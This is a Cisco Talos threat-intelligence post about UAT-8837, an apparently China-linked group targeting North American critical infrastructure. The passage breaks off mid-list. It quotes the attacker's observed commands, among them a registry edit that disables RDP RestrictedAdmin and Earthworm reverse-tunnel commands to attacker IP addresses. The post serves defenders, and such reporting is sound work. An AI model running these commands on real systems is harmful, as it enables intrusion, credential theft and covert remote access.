---
title: UAT-8837 targets critical infrastructure sectors in North America
url: https://blog.talosintelligence.com/uat-8837/
source: Over Security - Cybersecurity news aggregator
date: 2026-01-15
fetch_date: 2026-01-16T03:30:18.823618
---

# UAT-8837 targets critical infrastructure sectors in North America

[Blog](/)

[ ]

* [Intelligence Center](https://talosintelligence.com/reputation)

  [ ]

  + [# Intelligence Center](https://talosintelligence.com/reputation)
  + BACK
  + [Intelligence Search](https://talosintelligence.com/reputation_center)
  + [Email & Spam Trends](https://talosintelligence.com/reputation_center/email_rep)
* [Vulnerability Research](https://talosintelligence.com/vulnerability_info)

  [ ]

  + [# Vulnerability Research](https://talosintelligence.com/vulnerability_info)
  + BACK
  + [Vulnerability Reports](https://talosintelligence.com/vulnerability_reports)
  + [Microsoft Advisories](https://talosintelligence.com/ms_advisories)
* [Incident Response](https://talosintelligence.com/incident_response)

  [ ]

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](https://talosintelligence.com/incident_response/services#reactive-services)
  + [Proactive Services](https://talosintelligence.com/incident_response/services#proactive-services)
  + [Emergency Support](https://talosintelligence.com/incident_response/contact)
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  [ ]

  # Security Resources

  + BACK

  Security Resources
  + [Open Source Security Tools](https://talosintelligence.com/software)
  + [Intelligence Categories Reference](https://talosintelligence.com/categories)
  + [Secure Endpoint Naming Reference](https://talosintelligence.com/secure-endpoint-naming)
* Media

  [ ]

  # Media

  + BACK

  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](https://talosintelligence.com/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](https://talosintelligence.com/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  [ ]

  # Company

  + BACK

  Company
  + [About Talos](https://talosintelligence.com/about)
  + [Careers](https://talosintelligence.com/careers)

# UAT-8837 targets critical infrastructure sectors in North America

By
[Asheer Malhotra](https://blog.talosintelligence.com/author/asheer-malhotra/),
[Vitor Ventura](https://blog.talosintelligence.com/author/vitor-ventura/),
[Brandon White](https://blog.talosintelligence.com/author/brandon/)

Thursday, January 15, 2026 06:00

[Threat Spotlight](https://blog.talosintelligence.com/category/threat-spotlight/)

* Cisco Talos is closely tracking UAT-8837, a threat actor we assess with medium confidence is a China-nexus advanced persistent threat (APT) actor based on overlaps in tactics, techniques, and procedures (TTPs) with those of other known China-nexus threat actors.
* Based on UAT-8837's TTPs and post-compromise activity Talos has observed across multiple intrusions, we assess with medium confidence that this actor is primarily tasked with obtaining initial access to high-value organizations.
* Although UAT-8837's targeting may appear sporadic, since at least 2025, the group has clearly focused on targets within [critical Infrastructure sectors](https://www.cisa.gov/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors) in North America.

After obtaining initial access — either by successful exploitation of vulnerable servers or by using compromised credentials — UAT-8837 predominantly deploys open-source tools to harvest sensitive information such as credentials, security configurations, and domain and Active Directory (AD) information to create multiple channels of access to their victims. The threat actor uses a combination of tools in their post-compromise hands-on-keyboard operations, including Earthworm, Sharphound, DWAgent, and Certipy. The TTPs, tooling, and remote infrastructure associated with UAT-8837 were also seen in the recent exploitation of [CVE-2025-53690](https://cloud.google.com/blog/topics/threat-intelligence/viewstate-deserialization-zero-day-vulnerability), a ViewState Deserialization zero-day vulnerability in SiteCore products, indicating that UAT-8837 may have access to zero-day exploits.

---

## Post-compromise actions

UAT-8837 can exploit both n-day and zero-day vulnerabilities to gain access to target environments. Most recently, UAT-8837 exploited a ViewState Deserialization zero-day vulnerability in SiteCore products, [CVE-2025-53690](https://cloud.google.com/blog/topics/threat-intelligence/viewstate-deserialization-zero-day-vulnerability), to obtain initial access.

After UAT-8837 gains initial access, they begin conducting preliminary reconnaissance, leveraging the following commands:

```
ping google[.]com
tasklist /svc
netstat -aon -p TCP
whoami
quser
hostname
net user
```

The threat actor disables RestrictedAdmin for Remote Desktop Protocol (RDP) to obtain credentials for remoting into other devices:

```
REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

A shell console may subsequently be opened via “cmd.exe” to conduct hands-on keyboard activity on the compromised endpoint. Multiple artifacts are then downloaded to the following directories which were extensively used for staging artifacts:

```
C:\Users\<user>\Desktop\
C:\windows\temp\
C:\windows\public\music
```

## UAT-8837 tool usage

UAT-8837 may use a variety of tooling throughout the course of an intrusion. This variation in tooling may be because many of these tools are detected and blocked by most security products such as Cisco Secure Endpoint (CSE) which often leads the threat actor to cycle through different variants of the tools to find versions that are not detected.

### GoTokenTheft

The [GoTokenTheft](https://github.com/Aquilao/GoTokenTheft) utility is a tool for stealing access tokens. Written in GoLang and deployed at C:\Users\<user>\Desktop\go.exe, it may be used to steal tokens to run commands with elevated privileges:

```
eee.ico REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

### Earthworm

Earthworm is network tunneling tool that has extensively been used by Chinese-speaking threat actors in intrusions to expose internal endpoints to attacker-owned remote infrastructure. UAT-8837 deploys multiple versions of Earthworm to determine which are not detectable by endpoint protection products. The undetected version is then used to create a reverse tunnel to attacker-controlled servers, as seen in the commands below:

```
C:\Windows\Temp\v.ico -s rssocks -d 172[.]188[.]162[.]183 -e 1433

C:\users\public\videos\verr.ico -s rssocks -d 172.188.162.183 -e 443

C:\Windows\Temp\eir.ico  -p 8888 -t 172[.]188[.]162[.]183 -f 11112

cisos.ico -s rssocks -d 172[.]188[.]162[.]183 –e80

vgent.ico -s rssocks -d 172[.]188[.]162[.]183 -e 443

vgent.ico -s rssocks -d 172[.]188[.]162[.]183 -e 447

abc.ico -s rssocks -d 4[.]144[.]1[.]47 -e 448

C:\users\public\music\aa.exe -s rssocks -d 74[.]176[.]166[.]174 -e 443

C:\Users\public\Music\twd.exe -s rssocks -d 20[.]200[.]129[.]75 -e 443
```

### DWAgent

UAT-8837 deploys DWAgent, a remote administration tool, to make it easier to access the compromised endpoint and drop additional malware to the system:

```
C:\Users\\Downloads\dwagent.exe

C:\Users\\AppData\Local\Temp\dwagent20250909101732\runtime\dwagent.exe -S -m installer
```

### SharpHound

Per Talos’ observations, UAT-8837 downloads SharpHound with the intention to collect Active Directory information:

```
C:\Windows\Temp\SharpHound.exe
```

### Impacket

UAT-8837 makes several attempts to download Impacket-based binaries to use in their operations:

```
C:\Windows\Temp\wec.ico
```

When Impacket is detected and blocked, [Invoke-WMIExec](https://github.com/Kevin-Robertson/Invoke-TheHash) is downloaded to run commands with elevated privileges:

```
C:\Windows\Temp\Invoke-WMIExec.ps1
```

### GoExec
...